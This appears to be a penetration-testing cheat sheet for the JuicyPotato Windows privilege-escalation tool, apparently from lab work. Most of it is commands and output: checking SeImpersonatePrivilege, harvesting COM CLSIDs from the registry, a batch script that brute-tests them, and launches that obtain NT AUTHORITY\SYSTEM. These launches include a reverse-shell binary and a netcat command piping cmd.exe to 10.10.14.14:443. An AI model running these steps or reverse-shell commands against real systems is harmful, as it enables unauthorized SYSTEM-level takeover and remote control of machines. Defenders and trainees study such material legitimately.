# JuicyPotato

Juicy Potato **doesn't work on Windows Server 2019 and Windows 10 1809 +**.

```powershell
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port

Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```

## SeImpersonatePrivilege

```powershell
PS C:\Users\jill> whoami /priv
PRIVILEGES INFORMATION                                                    
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

## Extracting CLSID

```powershell
PS C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads> New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

WARNING: column "CurrentLocation" does not fit into the display and was removed
.

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT

PS C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads> $CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
PS C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads> echo $CLSID > CLSID_both.list

# Clean it from powershell
get-content "CLSID_both.list" | foreach-object { $data = $_ -split "  "; "{0}" -f $data[1] } >> CLSID.list

# Download the file locally and "clean it"
$ awk '{print $2}' CLSID_both.list | tr -d '\000' > CLSID.list
```

## Testing valid CLSID for privilege escalation

```bash
┌──(kali㉿kali)-[~/…/student/73/p8080/www]
└─$ cat clsid.bat      
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads\CLSID_only.list) DO (
   echo %%i !port!
   C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads\JP_x86.exe -z -l !port! -c %%i >> C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads\result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)
```

```powershell
C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads> .\clsid.bat
{00021401-0000-0000-C000-000000000046} 10000
{000C101C-0000-0000-C000-000000000046} 10000
{0010890e-8789-413c-adbc-48f5b511b3af} 10000
{00393519-3A67-4507-A2B8-85146167ACA7} 10000
{00597829-82CE-44d4-8B0B-40BE695973B5} 10000
{00BC7EAE-28D5-4310-BE9F-11526A7FA37F} 10000
{00f2b433-44e4-4d88-b2b0-2698a0a91dba} 10000
{010911E2-F61C-479B-B08C-43E6D1299EFE} 10000
{0142e4d1-fb7a-11dc-ba4a-000ffe7ab428} 10000
{01D0A625-782D-4777-8D4E-547E6457FAD5} 10000
{0228576F-6E6C-4E1A-B175-0E46A316AFE2} 10000
...

C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads> type result.log
{0289a7c5-91bf-4547-81ae-fec91a89dec5};GAMMA\jill
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM
{0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE
{1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\LOCAL SERVICE
{204810b9-73b2-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{2e5e84e9-4049-4244-b728-2d24227157c7};NT AUTHORITY\LOCAL SERVICE
{3c6859ce-230b-48a4-be6c-932c0c202048};NT AUTHORITY\SYSTEM
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
{5BF9AA75-D7FF-4aee-AA2C-96810586456D};NT AUTHORITY\LOCAL SERVICE
{659cdea7-489e-11d9-a9cd-000d56965251};NT AUTHORITY\SYSTEM
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM
{6d18ad12-bde3-4393-b311-099c346e6df9};NT AUTHORITY\SYSTEM
{6d8ff8d2-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8dc-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8dd-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8df-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8e0-730d-11d4-bf42-00b0d0118b56};GAMMA\jill
{6d8ff8e1-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8e5-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{6d8ff8e7-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\LOCAL SERVICE
{752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
{8F5DF053-3013-4dd8-B5F4-88214E81C0CF};NT AUTHORITY\SYSTEM
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8};NT AUTHORITY\SYSTEM
{9678f47f-2435-475c-b24a-4606f8161c16};GAMMA\jill
{98068995-54d2-4136-9bc9-6dbcb0a4683f};GAMMA\jill
{9acf41ed-d457-4cc1-941b-ab02c26e4686};GAMMA\jill
{A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\LOCAL SERVICE
```

```powershell
# Single command
C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads>.\JP_x86.exe -l 9001 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} -p C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads\revShell.exe
.\JP_x86.exe -l 9001 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} -p C:\wamp\www\PHP\spoiler\fileManager\collectives\DG0\custom-uploads\revShell.exe
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9001
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

# Cmd + args
C:\users\kohsuke\downloads>.\JP.exe -l 9001 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -a "/c C:\users\kohsuke\downloads\nc.exe 10.10.14.14 443 -e cmd.exe" -p cmd.exe
.\JP.exe -l 9001 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -a "/c C:\users\kohsuke\downloads\nc.exe 10.10.14.14 443 -e cmd.exe" -p cmd.exe
Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 9001
......
[+] authresult 0
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

# Tools

- [Juicy Potato](https://github.com/ohpe/juicy-potato)
- [test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)